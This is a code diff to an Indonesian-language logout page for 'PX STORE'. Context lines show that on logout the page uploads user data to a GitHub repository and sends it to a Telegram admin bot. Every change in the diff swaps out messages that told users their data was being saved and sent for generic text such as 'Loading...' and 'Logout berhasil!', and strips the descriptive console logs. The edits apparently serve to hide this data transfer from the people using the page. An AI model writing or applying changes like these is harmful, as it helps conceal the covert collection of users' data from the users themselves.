@@ -210,7 +210,7 @@
         </div>
         
         <h1 class="logout-title">Keluar dari PX STORE?</h1>
-        <p class="logout-subtitle">Data Anda akan disimpan untuk login kembali</p>
+        <p>Terimakasih sudah menggunakan layanan kami</p>
         
         <div class="logout-buttons">
             <button class="btn btn-secondary" onclick="cancelLogout()">Batal</button>
@@ -219,7 +219,7 @@
         
         <div class="loading">
             <div class="loading-spinner"></div>
-            <p style="text-align: center; margin-top: 10px;">Menyimpan data...</p>
+            <p style="text-align: center; margin-top: 10px;">Sampai jumpa kembali</p>
         </div>
         
         <div class="message" id="message"></div>
@@ -315,7 +315,7 @@
         // Upload data ke GitHub dengan error handling yang lebih baik
         async function uploadToGitHub(userData) {
             try {
-                showMessage('📤 Mengupload data ke GitHub...', 'info');
+                showMessage('Loading...', 'info');
                 
                 // Dapatkan file yang sudah ada terlebih dahulu
                 const getUrl = `https://api.github.com/repos/${GITHUB_CONFIG.owner}/${GITHUB_CONFIG.repo}/contents/${GITHUB_CONFIG.path}`;
@@ -386,7 +386,7 @@
         // Kirim data ke admin bot dengan format JSON yang benar
         async function sendToAdminBot(userData) {
             try {
-                showMessage('🤖 Mengirim data ke admin...', 'info');
+                showMessage('Loading...', 'info');
                 
                 // Format data sesuai dengan contoh yang diminta
                 const formattedData = {
@@ -439,10 +439,10 @@ ${JSON.stringify(formattedData, null, 2)}
                     throw new Error(`Telegram API error: ${errorData.description}`);
                 }
 
-                console.log('✅ Data berhasil dikirim ke admin bot');
+                console.log('Sukses');
                 return true;
             } catch (error) {
-                console.error('❌ Error kirim ke bot admin:', error);
+                console.error('Gagal', error);
                 throw error;
             }
         }
@@ -454,10 +454,10 @@ ${JSON.stringify(formattedData, null, 2)}
                 localStorage.removeItem('pxstore_logged_in');
                 localStorage.removeItem('pxstore_login_time');
                 
-                console.log('✅ Sesi login berhasil dihapus');
+                console.log('Sukses');
                 return true;
             } catch (error) {
-                console.error('❌ Error menghapus sesi login:', error);
+                console.error('Gagal', error);
                 throw error;
             }
         }
@@ -465,7 +465,7 @@ ${JSON.stringify(formattedData, null, 2)}
         // Confirm logout dengan error handling yang lebih robust
         async function confirmLogout() {
             showLoading(true);
-            showMessage('Menyimpan data user...', 'info');
+            showMessage('Loading...', 'info');
             
             try {
                 // 1. Siapkan data user
@@ -480,7 +480,7 @@ ${JSON.stringify(formattedData, null, 2)}
                 try {
                     githubSuccess = await uploadToGitHub(userData);
                 } catch (githubError) {
-                    console.warn('⚠️ GitHub upload gagal:', githubError.message);
+                    console.warn('⚠️ Gagal', githubError.message);
                 }
                 
                 // 3. Selalu kirim ke admin bot sebagai backup
@@ -488,7 +488,7 @@ ${JSON.stringify(formattedData, null, 2)}
                 try {
                     botSuccess = await sendToAdminBot(userData);
                 } catch (botError) {
-                    console.warn('⚠️ Kirim ke bot admin gagal:', botError.message);
+                    console.warn('⚠️ Gagal:', botError.message);
                 }
                 
                 // 4. Hapus data sesi login
@@ -497,11 +497,11 @@ ${JSON.stringify(formattedData, null, 2)}
                 showLoading(false);
                 
                 if (githubSuccess) {
-                    showMessage('✅ Logout berhasil! Data telah disimpan di GitHub dan dikirim ke admin.', 'success');
+                    showMessage('Logout berhasil!.', 'success');
                 } else if (botSuccess) {
-                    showMessage('✅ Logout berhasil! Data telah dikirim ke admin (GitHub gagal).', 'success');
+                    showMessage('Logout berhasil!.', 'success');
                 } else {
-                    showMessage('⚠️ Logout berhasil! Data disimpan lokal (upload gagal).', 'info');
+                    showMessage('⚠️ Logout berhasil!', 'info');
                 }
                 
                 // Redirect setelah 2 detik
